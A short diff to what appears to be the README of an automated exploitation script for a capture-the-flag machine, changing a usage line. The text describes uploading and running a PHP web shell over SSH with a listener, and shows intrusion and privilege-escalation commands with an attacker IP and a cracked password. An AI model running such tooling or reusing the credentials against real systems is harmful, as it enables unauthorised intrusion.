@@ -53,7 +53,7 @@ The script will upload and execute shell.php over SSH and open a listener for th
 python3 autopwn.py --type-attack intrusion --ip 10.10.14.5 --port 8000
 
 # Step 2: After cracking albert’s hash...
-python3 autopwn.py --type-attack privesc --ip 10.10.14.5 --port 4444 --ssh-pass manchesterunited
+python3 autopwn.py --type-attack privesc --ip 10.10.14.5 --ssh-pass manchesterunited
 ```
 ### 🛠️ Features
 
